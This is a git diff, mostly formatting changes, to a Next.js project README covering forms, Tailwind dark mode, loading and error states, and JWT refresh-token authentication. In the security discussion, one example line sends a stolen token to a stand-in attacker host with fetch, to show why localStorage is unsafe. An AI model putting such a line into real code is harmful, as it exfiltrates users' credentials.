@@ -7200,9 +8161,10 @@ Display validation errors with accessibility:
 ### Files Created
 
 **Files:**
--  [components/FormInput.tsx](./ttaurban/components/FormInput.tsx) - Reusable form input with validation
--  [app/signup/page.tsx](./ttaurban/app/signup/page.tsx) - User signup form
--  [app/contact/page.js](./ttaurban/app/contact/page.js) - Contact form
+
+- [components/FormInput.tsx](./ttaurban/components/FormInput.tsx) - Reusable form input with validation
+- [app/signup/page.tsx](./ttaurban/app/signup/page.tsx) - User signup form
+- [app/contact/page.js](./ttaurban/app/contact/page.js) - Contact form
 
 ### Key Achievements
 
@@ -7230,11 +8192,9 @@ Display validation errors with accessibility:
 7. ** Validate on Submit:** Avoid validating on every keystroke
 8. ** Create Reusable Components:** FormInput, FormSelect, etc.
 
-
-
 ---
 
-##  Responsive & Themed Design with Tailwind CSS
+## Responsive & Themed Design with Tailwind CSS
 
 ### Overview
 
@@ -7242,13 +8202,13 @@ Modern web applications must work seamlessly across devices (mobile, tablet, des
 
 ### Why Responsive & Themed Design Matters
 
-| Concern | Solution | Impact |
-|---------|----------|--------|
-| Mobile traffic ~60% | Responsive breakpoints | Better UX on all devices |
-| User preference | Dark mode support | Reduced eye strain, accessibility |
-| Consistency | Design system | Faster development, cohesive UI |
-| Performance | Utility classes | Minimal CSS bundle size |
-| Accessibility | High contrast themes | WCAG compliance |
+| Concern             | Solution               | Impact                            |
+| ------------------- | ---------------------- | --------------------------------- |
+| Mobile traffic ~60% | Responsive breakpoints | Better UX on all devices          |
+| User preference     | Dark mode support      | Reduced eye strain, accessibility |
+| Consistency         | Design system          | Faster development, cohesive UI   |
+| Performance         | Utility classes        | Minimal CSS bundle size           |
+| Accessibility       | High contrast themes   | WCAG compliance                   |
 
 ### Tailwind CSS Configuration
 
@@ -7257,31 +8217,31 @@ Modern web applications must work seamlessly across devices (mobile, tablet, des
 **File: [tailwind.config.ts](./ttaurban/tailwind.config.ts)**
 
 ```typescript
-import type { Config } from 'tailwindcss';
+import type { Config } from "tailwindcss";
 
 export default {
-  content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}'],
-  darkMode: 'class', // Enable class-based dark mode
+  content: ["./app/**/*.{js,ts,jsx,tsx}", "./components/**/*.{js,ts,jsx,tsx}"],
+  darkMode: "class", // Enable class-based dark mode
   theme: {
     extend: {
       colors: {
         // Custom brand colors
         brand: {
-          light: '#60a5fa',
-          DEFAULT: '#3b82f6',
-          dark: '#2563eb',
+          light: "#60a5fa",
+          DEFAULT: "#3b82f6",
+          dark: "#2563eb",
         },
         // Extended color palette
         primary: {
-          50: '#eff6ff',
-          100: '#dbeafe',
+          50: "#eff6ff",
+          100: "#dbeafe",
           // ... up to 900
         },
       },
       screens: {
         // Custom breakpoints
-        xs: '475px',
-        '3xl': '1920px',
+        xs: "475px",
+        "3xl": "1920px",
       },
     },
   },
@@ -7289,6 +8249,7 @@ export default {
 ```
 
 **Key Configuration:**
+
 - **darkMode: 'class'** - Toggle dark mode by adding/removing 'dark' class on html element
 - **Custom Colors** - Brand colors accessible as bg-brand, text-brand, etc.
 - **Responsive Breakpoints** - Mobile-first: sm (640px), md (768px), lg (1024px), xl (1280px)
@@ -7321,12 +8282,12 @@ export default {
     @apply bg-indigo-600 dark:bg-indigo-500 text-white px-4 py-2 rounded-lg 
            hover:bg-indigo-700 dark:hover:bg-indigo-600 transition-colors font-medium;
   }
-  
+
   .card {
     @apply bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 
            rounded-lg shadow-md p-6 transition-colors;
   }
-  
+
   .input-field {
     @apply w-full border border-gray-300 dark:border-gray-600 
            bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 
@@ -7338,6 +8299,7 @@ export default {
 ```
 
 **Benefits:**
+
 - **CSS Variables** - Dynamic theming with :root
 - **@layer components** - Reusable utility combos (btn-primary, card)
 - **prefers-color-scheme** - Respect system preference as fallback
@@ -7372,10 +8334,11 @@ export function UIProvider({ children }: { children: ReactNode }) {
   // Hydrate theme from localStorage after mount (prevent SSR mismatch)
   useEffect(() => {
     const savedTheme = localStorage.getItem("theme") as Theme;
-    const systemPreference = window.matchMedia("(prefers-color-scheme: dark)").matches
+    const systemPreference = window.matchMedia("(prefers-color-scheme: dark)")
+      .matches
       ? "dark"
       : "light";
-    
+
     const initialTheme = savedTheme || systemPreference;
     setTheme(initialTheme);
     document.documentElement.classList.toggle("dark", initialTheme === "dark");
@@ -7393,7 +8356,9 @@ export function UIProvider({ children }: { children: ReactNode }) {
   if (!mounted) return null;
 
   return (
-    <UIContext.Provider value={{ theme, toggleTheme, sidebarOpen, toggleSidebar }}>
+    <UIContext.Provider
+      value={{ theme, toggleTheme, sidebarOpen, toggleSidebar }}
+    >
       {children}
     </UIContext.Provider>
   );
@@ -7424,15 +8389,18 @@ export default function ThemeToggle() {
       onClick={toggleTheme}
       className="p-2 rounded-lg bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 
                  dark:hover:bg-gray-700 transition-colors"
-      aria-label={theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode'}
+      aria-label={
+        theme === "dark" ? "Switch to light mode" : "Switch to dark mode"
+      }
     >
-      {theme === 'dark' ? '' : ''}
+      {theme === "dark" ? "" : ""}
     </button>
   );
 }
 ```
 
 **Features:**
+
 - **Visual Feedback** - Sun/moon icon based on current theme
 - **Accessibility** - aria-label for screen readers
 - **Smooth Transitions** - transition-colors for theme change
@@ -7451,7 +8419,9 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 // Large (lg, >= 1024px): 4 columns
 
 <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
-  {items.map(item => <Card key={item.id} {...item} />)}
+  {items.map((item) => (
+    <Card key={item.id} {...item} />
+  ))}
 </div>
 ```
 
@@ -7492,15 +8462,21 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
         href="/"
         className="text-lg md:text-xl font-bold text-indigo-600 dark:text-indigo-400"
       >
-         TTA-Urban
+        TTA-Urban
       </Link>
 
       {/* Desktop menu - hidden on mobile */}
       <div className="hidden md:flex space-x-4">
-        <Link href="/" className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400">
+        <Link
+          href="/"
+          className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400"
+        >
           Home
         </Link>
-        <Link href="/dashboard" className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400">
+        <Link
+          href="/dashboard"
+          className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400"
+        >
           Dashboard
         </Link>
       </div>
@@ -7508,7 +8484,10 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
       {/* Theme toggle + Sign In */}
       <div className="flex items-center gap-3">
         <ThemeToggle />
-        <Link href="/login" className="bg-indigo-600 dark:bg-indigo-500 text-white px-3 md:px-4 py-2 rounded-md text-sm">
+        <Link
+          href="/login"
+          className="bg-indigo-600 dark:bg-indigo-500 text-white px-3 md:px-4 py-2 rounded-md text-sm"
+        >
           Sign In
         </Link>
       </div>
@@ -7518,6 +8497,7 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 ```
 
 **Responsive Patterns:**
+
 - **hidden md:flex** - Hide menu on mobile, show on desktop
 - **text-lg md:text-xl** - Scale logo text
 - **px-3 md:px-4** - Reduce padding on mobile
@@ -7566,9 +8546,11 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 **5. Buttons**
 
 ```tsx
-<button className="bg-indigo-600 dark:bg-indigo-500 
+<button
+  className="bg-indigo-600 dark:bg-indigo-500 
                    hover:bg-indigo-700 dark:hover:bg-indigo-600
-                   focus:ring-offset-2 dark:focus:ring-offset-gray-800">
+                   focus:ring-offset-2 dark:focus:ring-offset-gray-800"
+>
   Click Me
 </button>
 ```
@@ -7576,6 +8558,7 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 #### Updated Components
 
 **Components with Dark Mode:**
+
 - [components/ui/Card.tsx](./ttaurban/components/ui/Card.tsx) - Dark backgrounds, borders, text
 - [components/ui/Modal.tsx](./ttaurban/components/ui/Modal.tsx) - Dark dialog with responsive sizing
 - [components/ui/Button.tsx](./ttaurban/components/ui/Button.tsx) - Dark variants for all button types
@@ -7590,11 +8573,13 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 1. **Open DevTools** - F12 or Ctrl+Shift+I (Windows), Cmd+Option+I (Mac)
 2. **Toggle Device Toolbar** - Ctrl+Shift+M (Windows), Cmd+Shift+M (Mac)
 3. **Select Device Preset:**
+
    - Mobile: iPhone 12 Pro (390x844)
    - Tablet: iPad Air (820x1180)
    - Desktop: Responsive 1920x1080
 
 4. **Test Breakpoints:**
+
    - 375px (iPhone SE) - Smallest mobile
    - 640px (sm) - Tablet portrait
    - 768px (md) - Tablet landscape
@@ -7602,11 +8587,11 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
    - 1280px (xl) - Large desktop
 
 5. **Verify:**
-   -  Text remains readable at all sizes
-   -  Buttons are tap-friendly (min 44x44px)
-   -  Navigation adapts (hidden menu on mobile)
-   -  Forms stack vertically on mobile
-   -  Images scale responsively
+   - Text remains readable at all sizes
+   - Buttons are tap-friendly (min 44x44px)
+   - Navigation adapts (hidden menu on mobile)
+   - Forms stack vertically on mobile
+   - Images scale responsively
 
 #### Dark Mode Testing
 
@@ -7615,24 +8600,27 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
    - Windows: Settings > Personalization > Colors > Choose your mode
    - Mac: System Preferences > General > Appearance
 3. **DevTools Simulation:**
-   - Open DevTools >  (Menu) > More tools > Rendering
+
+   - Open DevTools > (Menu) > More tools > Rendering
    - Scroll to "Emulate CSS media feature prefers-color-scheme"
    - Select "prefers-color-scheme: dark"
 
 4. **Verify:**
-   -  Theme persists across page reloads (localStorage)
-   -  All components adapt colors correctly
-   -  Sufficient contrast (WCAG AA: 4.5:1 for text)
-   -  Focus indicators visible in both modes
-   -  Smooth transitions between themes
+   - Theme persists across page reloads (localStorage)
+   - All components adapt colors correctly
+   - Sufficient contrast (WCAG AA: 4.5:1 for text)
+   - Focus indicators visible in both modes
+   - Smooth transitions between themes
 
 ### Files Created & Modified
 
 **New Files:**
+
 - [components/ui/ThemeToggle.tsx](./ttaurban/components/ui/ThemeToggle.tsx) - Theme toggle button
 - [tailwind.config.ts](./ttaurban/tailwind.config.ts) - Custom Tailwind configuration
 
 **Modified Files:**
+
 - [context/UIContext.tsx](./ttaurban/context/UIContext.tsx) - Added theme persistence
 - [app/globals.css](./ttaurban/app/globals.css) - Custom utility classes, dark mode variables
 - [app/layout.tsx](./ttaurban/app/layout.tsx) - Added theme toggle to navbar, responsive nav
@@ -7669,37 +8657,43 @@ Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then
 ### Reflection: Trade-offs & Decisions
 
 **Why Class-Based Dark Mode?**
--  **User Control:** Toggle independent of system preference
--  **Persistence:** localStorage saves preference across sessions
--  **Flexibility:** Can override system preference
--  **Complexity:** Requires JavaScript (vs pure CSS media query)
+
+- **User Control:** Toggle independent of system preference
+- **Persistence:** localStorage saves preference across sessions
+- **Flexibility:** Can override system preference
+- **Complexity:** Requires JavaScript (vs pure CSS media query)
 
 **Why Tailwind Utility Classes?**
--  **Performance:** Purged CSS reduces bundle size
--  **Consistency:** Design tokens enforced via configuration
--  **Speed:** No context switching between HTML/CSS
--  **Learning Curve:** Requires memorizing utility names
--  **HTML Verbosity:** Long className strings
+
+- **Performance:** Purged CSS reduces bundle size
+- **Consistency:** Design tokens enforced via configuration
+- **Speed:** No context switching between HTML/CSS
+- **Learning Curve:** Requires memorizing utility names
+- **HTML Verbosity:** Long className strings
 
 **Why Custom Component Classes?**
--  **Reusability:** btn-primary used across all buttons
--  **Maintainability:** Update once, changes propagate
--  **Readability:** Shorter classNames in JSX
--  **Indirection:** Must check globals.css for implementation
+
+- **Reusability:** btn-primary used across all buttons
+- **Maintainability:** Update once, changes propagate
+- **Readability:** Shorter classNames in JSX
+- **Indirection:** Must check globals.css for implementation
 
 **Responsive Breakpoint Strategy:**
+
 - **Mobile-First** - Base styles target smallest screens
 - **Tablet (sm: 640px)** - 2-column grids, show more content
 - **Desktop (md: 768px)** - Full navigation, wider layouts
 - **Large (lg: 1024px)** - Max width containers, 4-column grids
 
 **Color Contrast Ratios (WCAG AA):**
-- Light mode: gray-900 on white (21:1) 
-- Dark mode: gray-100 on gray-900 (18.5:1) 
-- Links: indigo-600 on white (4.5:1) 
-- Dark links: indigo-400 on gray-900 (7.8:1) 
+
+- Light mode: gray-900 on white (21:1)
+- Dark mode: gray-100 on gray-900 (18.5:1)
+- Links: indigo-600 on white (4.5:1)
+- Dark links: indigo-400 on gray-900 (7.8:1)
 
 ---
+
 ## ⏳ Error & Loading States
 
 ### Overview
@@ -7708,28 +8702,32 @@ Graceful error handling and loading states are critical for maintaining user tru
 
 ### Why Fallback UI Matters
 
-| State | Purpose | User Experience Impact |
-|-------|---------|------------------------|
+| State       | Purpose                         | User Experience Impact             |
+| ----------- | ------------------------------- | ---------------------------------- |
 | **Loading** | Indicates data is being fetched | Prevents confusion, shows progress |
-| **Error** | Handles failures gracefully | Maintains trust, offers recovery |
-| **Empty** | Shows when no data exists | Guides users to next action |
+| **Error**   | Handles failures gracefully     | Maintains trust, offers recovery   |
+| **Empty**   | Shows when no data exists       | Guides users to next action        |
 
 **Without Loading States:**
+
 - ❌ Blank screens confuse users
 - ❌ Sudden content appears (jarring)
 - ❌ Users think app is broken
 
 **With Loading States:**
+
 - ✅ Users know app is working
 - ✅ Visual structure previews content
 - ✅ Professional, polished feel
 
 **Without Error Boundaries:**
+
 - ❌ App crashes completely
 - ❌ No way to recover
 - ❌ User loses all context
 
 **With Error Boundaries:**
+
 - ✅ Graceful degradation
 - ✅ Retry functionality
 - ✅ User stays in control
@@ -7776,7 +8774,10 @@ export default function Loading() {
         {/* User Cards Grid Skeleton */}
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
           {[1, 2, 3, 4, 5, 6].map((i) => (
-            <div key={i} className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 animate-pulse">
+            <div
+              key={i}
+              className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 animate-pulse"
+            >
               {/* Avatar + Name Skeleton */}
               <div className="flex items-center space-x-4 mb-4">
                 <div className="w-12 h-12 bg-gray-200 dark:bg-gray-700 rounded-full"></div>
@@ -7785,14 +8786,14 @@ export default function Loading() {
                   <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-1/2"></div>
                 </div>
               </div>
-              
+
               {/* Content Skeleton */}
               <div className="space-y-3">
                 <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-full"></div>
                 <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-5/6"></div>
                 <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-4/6"></div>
               </div>
-              
+
               {/* Button Skeleton */}
               <div className="mt-4 h-10 bg-gray-200 dark:bg-gray-700 rounded"></div>
             </div>
@@ -7805,6 +8806,7 @@ export default function Loading() {
 ```
 
 **Key Patterns:**
+
 - **animate-pulse** - Tailwind's built-in pulsing animation
 - **Neutral colors** - gray-200 (light) / gray-700 (dark)
 - **Match structure** - Skeleton mirrors actual content layout
@@ -7816,6 +8818,7 @@ export default function Loading() {
 **File: [app/dashboard/loading.tsx](./ttaurban/app/dashboard/loading.tsx)**
 
 Features:
+
 - Stats cards skeleton (4 cards in grid)
 - Chart visualization placeholder
 - Table rows skeleton
@@ -7826,6 +8829,7 @@ Features:
 **File: [app/contact/loading.tsx](./ttaurban/app/contact/loading.tsx)**
 
 Features:
+
 - Contact info cards skeleton
 - Form fields skeleton
 - Maintains layout structure
@@ -7851,9 +8855,18 @@ export default function Error({
       <div className="max-w-md w-full bg-white dark:bg-gray-800 rounded-lg shadow-lg p-8 text-center">
         {/* Error Icon */}
         <div className="mb-6">
-          <svg className="w-16 h-16 mx-auto text-red-500 dark:text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} 
-              d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          <svg
+            className="w-16 h-16 mx-auto text-red-500 dark:text-red-400"
+            fill="none"
+            stroke="currentColor"
+            viewBox="0 0 24 24"
+          >
+            <path
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              strokeWidth={2}
+              d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
+            />
           </svg>
         </div>
 
@@ -7874,15 +8887,25 @@ export default function Error({
           >
             Try Again
           </button>
-          <a href="/" className="px-6 py-3 bg-gray-200 dark:bg-gray-700 text-gray-700 
-                                 dark:text-gray-200 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600">
+          <a
+            href="/"
+            className="px-6 py-3 bg-gray-200 dark:bg-gray-700 text-gray-700 
+                                 dark:text-gray-200 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600"
+          >
             Go Home
           </a>
         </div>
 
         {/* Help Text */}
         <p className="mt-6 text-sm text-gray-500 dark:text-gray-400">
-          If this problem persists, please <a href="/contact" className="text-indigo-600 dark:text-indigo-400 hover:underline">contact support</a>.
+          If this problem persists, please{" "}
+          <a
+            href="/contact"
+            className="text-indigo-600 dark:text-indigo-400 hover:underline"
+          >
+            contact support
+          </a>
+          .
         </p>
       </div>
     </div>
@@ -7891,6 +8914,7 @@ export default function Error({
 ```
 
 **Key Features:**
+
 - **"use client" directive** - Required for error boundaries
 - **reset() function** - Re-renders the route, allowing retry
 - **error.message** - Shows specific error details
@@ -7901,10 +8925,12 @@ export default function Error({
 #### Dashboard & Contact Error Boundaries
 
 **Files:**
+
 - [app/dashboard/error.tsx](./ttaurban/app/dashboard/error.tsx)
 - [app/contact/error.tsx](./ttaurban/app/contact/error.tsx)
 
 Each has context-specific:
+
 - Custom error icons
 - Tailored error messages
 - Alternative contact methods
@@ -7919,7 +8945,9 @@ Each has context-specific:
 // Base Skeleton
 export function Skeleton({ className = "" }: SkeletonProps) {
   return (
-    <div className={`animate-pulse bg-gray-200 dark:bg-gray-700 rounded ${className}`}></div>
+    <div
+      className={`animate-pulse bg-gray-200 dark:bg-gray-700 rounded ${className}`}
+    ></div>
   );
 }
 
@@ -7937,13 +8965,19 @@ export function CardSkeleton() {
 }
 
 // Table Row Skeleton
-export function TableRowSkeleton() { /* ... */ }
+export function TableRowSkeleton() {
+  /* ... */
+}
 
 // Page Skeleton
-export function PageSkeleton() { /* ... */ }
+export function PageSkeleton() {
+  /* ... */
+}
 
 // Spinner
-export function Spinner({ size = "md" }) { /* ... */ }
+export function Spinner({ size = "md" }) {
+  /* ... */
+}
 ```
 
 **Usage Examples:**
@@ -8008,14 +9042,15 @@ export default function Error({ error, reset }) {
 // In page.tsx
 export default async function UsersPage() {
   // Add artificial delay
-  await new Promise(resolve => setTimeout(resolve, 3000));
-  
+  await new Promise((resolve) => setTimeout(resolve, 3000));
+
   const users = await fetchUsers();
   return <UsersList users={users} />;
 }
 ```
 
 **Browser Network Throttling:**
+
 1. Open DevTools (F12)
 2. Go to Network tab
 3. Select "Slow 3G" or "Fast 3G"
@@ -8029,12 +9064,12 @@ export default async function UsersPage() {
 // In page.tsx
 export default async function UsersPage() {
   const users = await fetchUsers();
-  
+
   // Throw error to test error boundary
   if (!users || users.length === 0) {
     throw new Error("Failed to load user data");
   }
-  
+
   return <UsersList users={users} />;
 }
 ```
@@ -8068,16 +9103,19 @@ throw new Error("Internal server error");
 ### Files Created
 
 **Loading Files:**
+
 - [app/users/loading.tsx](./ttaurban/app/users/loading.tsx) - User cards grid skeleton
 - [app/dashboard/loading.tsx](./ttaurban/app/dashboard/loading.tsx) - Stats + chart + table skeleton
 - [app/contact/loading.tsx](./ttaurban/app/contact/loading.tsx) - Contact form skeleton
 
 **Error Files:**
+
 - [app/users/error.tsx](./ttaurban/app/users/error.tsx) - User data error boundary
 - [app/dashboard/error.tsx](./ttaurban/app/dashboard/error.tsx) - Dashboard error boundary
 - [app/contact/error.tsx](./ttaurban/app/contact/error.tsx) - Contact form error boundary
 
 **Reusable Components:**
+
 - [components/ui/Skeleton.tsx](./ttaurban/components/ui/Skeleton.tsx) - Skeleton primitives
 - [components/ui/ErrorFallback.tsx](./ttaurban/components/ui/ErrorFallback.tsx) - Reusable error UI
 
@@ -8095,6 +9133,7 @@ throw new Error("Internal server error");
 ### Design Decisions
 
 **Why Skeletons Over Spinners?**
+
 - ✅ **Visual Structure:** Users see what's loading
 - ✅ **Perceived Performance:** Feels faster than spinner
 - ✅ **Layout Stability:** No content shift when loaded
@@ -8102,6 +9141,7 @@ throw new Error("Internal server error");
 - ❌ **More Work:** Must match actual content structure
 
 **Why Route-Level Error Boundaries?**
+
 - ✅ **Granular Control:** Each route handles errors independently
 - ✅ **Preserved State:** Other routes remain functional
 - ✅ **Custom Messages:** Context-specific error messages
@@ -8109,6 +9149,7 @@ throw new Error("Internal server error");
 - ❌ **More Files:** Need error.tsx for each route
 
 **Why Retry Functionality?**
+
 - ✅ **User Empowerment:** Users can fix transient errors
 - ✅ **Reduced Support:** Less "it's broken" tickets
 - ✅ **Better Conversion:** Users don't abandon app
@@ -8130,12 +9171,14 @@ throw new Error("Internal server error");
 ### User Experience Impact
 
 **Loading States:**
+
 - ⬆️ **Perceived Speed:** Users think app is faster
 - ⬆️ **User Confidence:** Clear feedback builds trust
 - ⬇️ **Bounce Rate:** Users less likely to leave
 - ⬆️ **Engagement:** Professional feel increases engagement
 
 **Error States:**
+
 - ⬆️ **User Satisfaction:** Graceful failures vs crashes
 - ⬇️ **Support Tickets:** Self-service recovery reduces tickets
 - ⬆️ **Retention:** Users don't abandon app after errors
@@ -8146,6 +9189,7 @@ throw new Error("Internal server error");
 In production applications, **asynchronous operations fail**. Networks drop, APIs timeout, servers crash. Users will encounter loading and error states - it's not a question of "if" but "when."
 
 Professional applications handle these states gracefully:
+
 - **Loading:** Show users progress, not blank screens
 - **Errors:** Offer recovery, not crashes
 - **Empty:** Guide users to action, not confusion
@@ -8153,6 +9197,7 @@ Professional applications handle these states gracefully:
 This implementation ensures TTA-Urban maintains user trust even when things go wrong. By providing clear feedback and recovery options, we transform potential frustration into confidence and resilience.
 
 **The difference between amateur and professional apps:**
+
 - Amateur: Blank screen → Error → Confusion → User leaves
 - Professional: Skeleton → Error with retry → Recovery → User stays
 
@@ -8165,6 +9210,7 @@ A comprehensive implementation of secure token-based authentication using **JWT 
 ### Overview
 
 This implementation provides:
+
 - **Dual Token System:** Short-lived access tokens (15 min) + Long-lived refresh tokens (7 days)
 - **HTTP-Only Cookies:** Refresh tokens stored securely, inaccessible to JavaScript
 - **Token Rotation:** Automatic refresh token rotation on each refresh for enhanced security
@@ -8202,6 +9248,7 @@ header.payload.signature
 ```
 
 **Components:**
+
 - **Header:** Algorithm (HS256) and token type (JWT)
 - **Payload:** User claims (id, email, role, expiry, issuer, audience)
 - **Signature:** HMAC hash ensuring token integrity and authenticity
@@ -8210,14 +9257,14 @@ header.payload.signature
 
 ### Access vs Refresh Tokens
 
-| Feature | Access Token | Refresh Token |
-|---------|-------------|---------------|
-| **Purpose** | API authentication | Obtain new access tokens |
-| **Lifespan** | 15 minutes | 7 days |
-| **Storage** | Memory (client state) | HTTP-only cookie |
-| **Data** | Full user info (id, email, name, role) | Minimal info (id, email) |
-| **Rotation** | No (short-lived) | Yes (on every refresh) |
-| **Exposure** | Sent with every API request | Sent only to refresh endpoint |
+| Feature      | Access Token                           | Refresh Token                 |
+| ------------ | -------------------------------------- | ----------------------------- |
+| **Purpose**  | API authentication                     | Obtain new access tokens      |
+| **Lifespan** | 15 minutes                             | 7 days                        |
+| **Storage**  | Memory (client state)                  | HTTP-only cookie              |
+| **Data**     | Full user info (id, email, name, role) | Minimal info (id, email)      |
+| **Rotation** | No (short-lived)                       | Yes (on every refresh)        |
+| **Exposure** | Sent with every API request            | Sent only to refresh endpoint |
 
 **Why Two Tokens?**
 
@@ -8229,6 +9276,7 @@ header.payload.signature
 ### Storage Location & Security
 
 #### Access Token
+
 **Storage:** In-memory (React state via `AuthContext`)
 
 ```tsx
@@ -8236,26 +9284,30 @@ const [accessToken, setAccessToken] = useState<string | null>(null);
 ```
 
 **Pros:**
+
 - ✅ Not vulnerable to XSS (cleared on page reload)
 - ✅ Fast access for API requests
 
 **Cons:**
+
 - ❌ Lost on page refresh (requires refresh token to restore)
 
 #### Refresh Token
+
 **Storage:** HTTP-only, SameSite Strict Cookie
 
 ```typescript
 response.cookies.set("refreshToken", refreshToken, {
-  httpOnly: true,        // ✅ Not accessible to JavaScript (XSS protection)
-  secure: true,          // ✅ HTTPS only in production
-  sameSite: "strict",    // ✅ CSRF protection
+  httpOnly: true, // ✅ Not accessible to JavaScript (XSS protection)
+  secure: true, // ✅ HTTPS only in production
+  sameSite: "strict", // ✅ CSRF protection
   maxAge: 7 * 24 * 60 * 60, // 7 days
   path: "/",
 });
 ```
 
 **Security Benefits:**
+
 - ✅ **XSS Protection:** JavaScript can't read `httpOnly` cookies
 - ✅ **CSRF Protection:** `sameSite: strict` prevents cross-site requests
 - ✅ **Secure Transmission:** `secure: true` enforces HTTPS
@@ -8273,6 +9325,7 @@ fetch("https://attacker.com/steal", { body: stolenToken });
 ```
 
 localStorage is accessible to **any JavaScript** on the page, including:
+
 - Third-party scripts
 - Browser extensions
 - XSS attacks (injected scripts)
@@ -8340,7 +9393,7 @@ const login = async (email: string, password: string) => {
   });
 
   const data = await response.json();
-  
+
   if (data.success) {
     setAccessToken(data.accessToken); // Store in memory
     setUser(data.user);
@@ -8376,17 +9429,17 @@ const login = async (email: string, password: string) => {
 export function withAuth(handler: AuthenticatedHandler) {
   return async (req: NextRequest) => {
     const token = req.headers.get("authorization")?.split(" ")[1];
-    
+
     if (!token) {
       return NextResponse.json({ error: "MISSING_TOKEN" }, { status: 401 });
     }
-    
+
     const user = verifyAccessToken(token);
-    
+
     if (!user) {
       return NextResponse.json({ error: "INVALID_TOKEN" }, { status: 401 });
     }
-    
+
     return await handler(req, user); // Inject user into handler
   };
 }
@@ -8465,31 +9518,38 @@ export const GET = withAuth(async (req, user) => {
 // app/api/auth/refresh/route.ts
 export async function POST(req: NextRequest) {
   const refreshToken = req.cookies.get("refreshToken")?.value;
-  
+
   if (!refreshToken) {
-    return NextResponse.json({ error: "MISSING_REFRESH_TOKEN" }, { status: 401 });
+    return NextResponse.json(
+      { error: "MISSING_REFRESH_TOKEN" },
+      { status: 401 }
+    );
   }
-  
+
   const decoded = verifyRefreshToken(refreshToken);
-  
+
   if (!decoded) {
-    const response = NextResponse.json({ error: "INVALID_REFRESH_TOKEN" }, { status: 401 });
+    const response = NextResponse.json(
+      { error: "INVALID_REFRESH_TOKEN" },
+      { status: 401 }
+    );
     response.cookies.delete("refreshToken"); // Clear invalid token
     return response;
   }
-  
+
   // Fetch fresh user data
   const user = await prisma.user.findUnique({ where: { id: decoded.id } });
-  
+
   if (!user) {
     return NextResponse.json({ error: "USER_NOT_FOUND" }, { status: 404 });
   }
-  
+
   // Generate new token pair (token rotation)
-  const { accessToken, refreshToken: newRefreshToken } = generateTokenPair(user);
-  
+  const { accessToken, refreshToken: newRefreshToken } =
+    generateTokenPair(user);
+
   const response = NextResponse.json({ success: true, accessToken, user });
-  
+
   // Rotate refresh token
   response.cookies.set("refreshToken", newRefreshToken, {
     httpOnly: true,
@@ -8497,7 +9557,7 @@ export async function POST(req: NextRequest) {
     sameSite: "strict",
     maxAge: 7 * 24 * 60 * 60,
   });
-  
+
   return response;
 }
 ```
@@ -8548,28 +9608,39 @@ useEffect(() => {
 
 ```typescript
 // lib/fetchWithAuth.ts
-export async function fetchWithAuth(url: string, options: RequestInit = {}): Promise<Response> {
+export async function fetchWithAuth(
+  url: string,
+  options: RequestInit = {}
+): Promise<Response> {
   const headers = new Headers(options.headers);
-  
+
   if (currentAccessToken) {
     headers.set("Authorization", `Bearer ${currentAccessToken}`);
   }
 
-  let response = await fetch(url, { ...options, headers, credentials: "include" });
+  let response = await fetch(url, {
+    ...options,
+    headers,
+    credentials: "include",
+  });
 
   // If 401 Unauthorized, try to refresh token and retry
   if (response.status === 401) {
     console.log("Access token expired, attempting refresh...");
-    
+
     const newToken = await refreshAccessToken();
-    
+
     if (newToken) {
       currentAccessToken = newToken;
       console.log("Token refreshed successfully, retrying request...");
-      
+
       // Retry with new token
       headers.set("Authorization", `Bearer ${newToken}`);
-      response = await fetch(url, { ...options, headers, credentials: "include" });
+      response = await fetch(url, {
+        ...options,
+        headers,
+        credentials: "include",
+      });
     } else {
       console.error("Token refresh failed, redirecting to login...");
       window.location.href = "/login";
@@ -8648,13 +9719,13 @@ const logout = async () => {
 
 ### Security Threat Mitigation
 
-| Threat | Description | Mitigation Strategy |
-|--------|-------------|---------------------|
-| **XSS (Cross-Site Scripting)** | Malicious scripts steal tokens from localStorage/cookies | ✅ Refresh token in `httpOnly` cookie<br>✅ Access token in memory (lost on XSS)<br>✅ Content Security Policy headers<br>✅ Input sanitization |
